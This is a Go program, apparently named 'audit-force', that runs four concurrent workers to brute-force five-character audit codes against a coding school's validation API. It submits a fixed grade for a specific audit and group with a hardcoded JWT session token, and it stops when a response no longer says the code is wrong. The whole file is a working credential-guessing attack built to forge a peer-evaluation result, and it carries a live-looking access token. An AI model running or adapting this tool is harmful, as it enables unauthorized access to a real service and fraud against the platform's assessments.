package main

import (
	"audit-force/utils"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"strings"
	"sync"
	"time"
)

type CodeCreator struct {
	charset string
	length  int
	index   int
}

func (codeCreator *CodeCreator) Next() string {
	code := [5]byte{}
	currentIndex := float64(codeCreator.index)
	//currentIndex := float64(102400000 - codeCreator.index)

	codeCreator.index++

	for i := codeCreator.length - 1; i >= 0; i-- {
		code[i] = codeCreator.charset[int(currentIndex)%len(codeCreator.charset)]
		currentIndex = math.Floor(currentIndex / float64(len(codeCreator.charset)))
	}

	return string(code[:])
}

func (codeCreator *CodeCreator) ToBase_10(code string) (sum int) {
	for i, v := range code {
		// Get the index of the character in the base
		index := strings.Index(codeCreator.charset, string(v))

		for j := codeCreator.length - 1; j > i; j-- {
			index *= len(codeCreator.charset)
		}

		sum += index
	}
	return
}

func main() {
	// The thingy that manages codes
	codeCreator := CodeCreator{
		charset: "abcdefghijklmnopqrstuvwxyz0123456789-_$?",
		length:  5,
		index:   0,
	}

	//fmt.Println(codeCreator.ToBase_10("gmfzw"))

	// fmt.Println(codeCreator.ToBase_10("gmfzd"))
	// os.Exit(0)

	// Time
	startTime := time.Now()
	lastCode := ""

	// The average counter thingy
	pIndex := codeCreator.length
	speedList := []int{}
	go func() {
		for {
			time.Sleep(time.Minute)

			speed := codeCreator.index - pIndex
			pIndex = codeCreator.index

			speedList = append(speedList, speed)

			fmt.Printf(
				"Code: %s, Index: %d, Progress: %.2f%%, Speed|Average: %d|%d/m, Time: %s\n",
				lastCode,
				codeCreator.index,
				float32(codeCreator.index)/102400000*100,
				speed,
				utils.IntSum(speedList...)/len(speedList),
				time.Now().Sub(startTime).String(),
			)
		}
	}()

	// Create a waitgroup for the main thread not to exit
	wg := sync.WaitGroup{}
	wg.Add(1)

	for i := 0; i < 4; i++ {
		go func() {
			client := &http.Client{}
			for {
				code := codeCreator.Next()
				lastCode = code

				responseText, err := checkCode(client, code)

				if err != nil {
					log.Println(err)
					wg.Done()
				}

				if !strings.Contains(responseText, "Wrong audit code.") {
					fmt.Printf("SUCCESS!! Code: %s, Response: %s\n", code, responseText)
					wg.Done()
				}
			}
		}()
	}

	wg.Wait()
	fmt.Println("---Program End---")
}

func checkCode(client *http.Client, code string) (string, error) {
	token := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIyMzY5IiwiaWF0IjoxNjUyNzg2MzU4LCJpcCI6IjIxMy4xODAuMTAuNTEsIDE3Mi4yMy4wLjIiLCJleHAiOjE2NTI4NzI3NTgsImh0dHBzOi8vaGFzdXJhLmlvL2p3dC9jbGFpbXMiOnsieC1oYXN1cmEtYWxsb3dlZC1yb2xlcyI6WyJ1c2VyIl0sIngtaGFzdXJhLWNhbXB1c2VzIjoie30iLCJ4LWhhc3VyYS1kZWZhdWx0LXJvbGUiOiJ1c2VyIiwieC1oYXN1cmEtdXNlci1pZCI6IjIzNjkiLCJ4LWhhc3VyYS10b2tlbi1pZCI6IjhkNzQxMGQwLTA1YzMtNDYzYy04ZGE1LTM2N2RmNjVmZTkwNSJ9fQ.MKCYfGCjTgGP8zPZAfC-xTdDHbU93-Wz725--7ObLvU"
	grade := 1.2857142857142858
	auditId := 12159
	eventId := 20
	groupId := 2159

	link := fmt.Sprintf(
		"https://01.kood.tech/api/validation/johvi/div-01/different-maps?grade=%f&code=%s&auditId=%d&eventId=%d&groupId=%d&feedback={}",
		grade,
		code,
		auditId,
		eventId,
		groupId,
	)

	req, err := http.NewRequest("GET", link, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("x-jwt-token", token)
	//req.Header.Set("Connection", "keep-alive")
	//req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0")

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	responseText := string(body)
	return responseText, nil
}
